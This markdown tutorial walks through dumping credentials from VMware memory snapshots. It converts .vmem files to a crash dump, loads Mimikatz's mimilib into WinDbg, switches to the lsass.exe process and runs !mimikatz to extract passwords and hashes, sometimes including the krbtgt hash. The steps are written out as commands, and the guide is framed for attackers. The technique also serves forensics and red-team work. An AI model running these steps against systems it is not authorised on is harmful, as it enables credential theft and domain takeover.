# Extracting Hashes and Passwords from VMWare Memory Snapshots

# Requirements

- Mimikatz
- VM
- bin2dmp.exe / vmss2core [https://flings.vmware.com/vmss2core](https://flings.vmware.com/vmss2core)  / [https://github.com/arizvisa/windows-binary-tools/blob/master/bin2dmp.exe](https://github.com/arizvisa/windows-binary-tools/blob/master/bin2dmp.exe)
- WinDbgx64 [https://docs.microsoft.com/en-us/windows-hardware/drivers/download-the-wdk](https://docs.microsoft.com/en-us/windows-hardware/drivers/download-the-wdk)

# Getting a .vmem file

Go to your vm in vmware workstation and take a snapshot of it 

![Extracting%20Hashes%20and%20Passwords%20from%20VMWare%20Memory/Untitled.png](Extracting%20Hashes%20and%20Passwords%20from%20VMWare%20Memory/Untitled.png)

This will generate few files in your vm folder

- client1-Snapshot3.vmem
- client1-Snapshot3.vmsn

![Extracting%20Hashes%20and%20Passwords%20from%20VMWare%20Memory/Untitled%201.png](Extracting%20Hashes%20and%20Passwords%20from%20VMWare%20Memory/Untitled%201.png)

# Getting a .dmp file

## Using bin2dmp.exe

bin2dmp.exe client1-Snapshot3.vmem memory.dmp

## Using vmss2core (recommended)

vmss2core-sb-8456865.exe -W8 client1-Snapshot3.vmsn client1-Snapshot3.vmem

![Extracting%20Hashes%20and%20Passwords%20from%20VMWare%20Memory/Untitled%202.png](Extracting%20Hashes%20and%20Passwords%20from%20VMWare%20Memory/Untitled%202.png)

You will get a a memory.dmp file

![Extracting%20Hashes%20and%20Passwords%20from%20VMWare%20Memory/Untitled%203.png](Extracting%20Hashes%20and%20Passwords%20from%20VMWare%20Memory/Untitled%203.png)

# Opening the memory.dmp file in WinDbgx64

![Extracting%20Hashes%20and%20Passwords%20from%20VMWare%20Memory/Untitled%204.png](Extracting%20Hashes%20and%20Passwords%20from%20VMWare%20Memory/Untitled%204.png)

## Importing mimilib.dll into WinDbgx64

Run .load c:\path\to\mimilib.dll

![Extracting%20Hashes%20and%20Passwords%20from%20VMWare%20Memory/Untitled%205.png](Extracting%20Hashes%20and%20Passwords%20from%20VMWare%20Memory/Untitled%205.png)

## Searching for lsass.exe process in memory

Type `!process 0 0 lsass.exe` this will search for the process and return its address

![Extracting%20Hashes%20and%20Passwords%20from%20VMWare%20Memory/Untitled%206.png](Extracting%20Hashes%20and%20Passwords%20from%20VMWare%20Memory/Untitled%206.png)

## Dumping passwords

Let's switch to lsass.exe process context using `.process /r /p <EPROCESS address>` 

![Extracting%20Hashes%20and%20Passwords%20from%20VMWare%20Memory/Untitled%207.png](Extracting%20Hashes%20and%20Passwords%20from%20VMWare%20Memory/Untitled%207.png)

And now run `!mimikatz` !

# Profit

You will also get krbtgt hash sometimes.

![Extracting%20Hashes%20and%20Passwords%20from%20VMWare%20Memory/Untitled%208.png](Extracting%20Hashes%20and%20Passwords%20from%20VMWare%20Memory/Untitled%208.png)

# Other tricks:

- `!envvar COMPUTERNAME` get computer name
- `!process 0 0x31 wininit.exe` dump winit.exe
- `!vm` get a list of processes and their usage
- `!process 0 0` list processes and their address
- `!peb`